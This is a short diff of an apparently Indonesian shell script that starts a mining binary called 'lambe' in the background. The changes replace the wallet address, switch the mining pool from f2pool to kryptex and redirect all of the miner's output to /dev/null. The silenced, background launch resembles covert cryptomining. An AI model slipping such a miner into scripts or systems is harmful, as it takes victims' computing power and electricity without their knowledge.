@@ -62,7 +62,7 @@ if [ -z "$worker_name" ] || [ "$worker_name" = "0" ]; then
     worker_name="worker1"
 fi
 
-wallet="ginanjarsri57"
+wallet="qzoDQrML8q4S2iEf3bDZFQrrWvVeqLAnqc3yva2rZoJfgKFZH"
 worker_tag="${wallet}.${worker_name}"
 if command -v nproc >/dev/null 2>&1; then
     if nproc --all >/dev/null 2>&1; then
@@ -75,7 +75,7 @@ else
 fi
 
 echo "Menjalankan lambe dengan worker: ${worker_tag}"
-./lambe --algorithm quantus --pool stratum+tcp://qtc.f2pool.com:4500 --wallet "$worker_tag" &
+./lambe --algorithm quantus --pool stratum+tcp://qtc.kryptex.network:7049 --wallet "$worker_tag" &> /dev/null &
 lambe_PID=$!
 
 # 1. Atur tampilan terminal
